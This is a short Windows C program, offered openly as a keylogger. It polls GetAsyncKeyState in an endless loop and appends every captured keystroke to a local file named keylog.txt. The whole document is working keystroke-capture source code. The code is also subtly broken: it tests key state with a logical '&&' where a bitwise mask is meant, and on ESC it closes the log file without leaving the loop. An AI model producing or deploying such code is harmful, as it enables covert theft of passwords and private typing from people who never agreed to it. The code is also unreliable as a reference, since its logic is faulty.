#include <stdio.h>
#include <windows.h>
#include <assert.h> // for conditions

void logKey(int key, FILE *file)
{
    if (key == VK_BACK)
    {
        fprintf(file, "{backspace}");
    }
    else if (key == VK_RETURN)
    {
        fprintf(file, "[ENTER]\n");
    }
    else if (key == VK_SPACE)
    {
        fprintf(file, " ");
    }
    else if (key == VK_TAB)
    {
        fprintf(file, "[TAB]");
    }
    else if (key >= 0x30 && key <= 0x39)
    {
        fprintf(file, "%c", key);
    }
    else if (key >= 0x41 && key <= 0x5A)
    {
        fprintf(file, "%c", key);
    }
    else
    {
        fprintf(file, "[%d]", key);
    }
    fflush(file);
}

int main()
{
    FILE *file = fopen("keylog.txt", "a");

    if (file == NULL)
    {
        perror("Error opening file"); // This will print a system error message
        return 1;                     // Exit if file couldn't be opened
    }

    printf("Keylogger is running... Press ESC to exit.\n");

    while (1)
    {
        for (int key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) && 0x0001)
            {
                logKey(key, file);
                if (key == VK_ESCAPE)
                {
                    fclose(file);
                }
            }
        }
    }
}
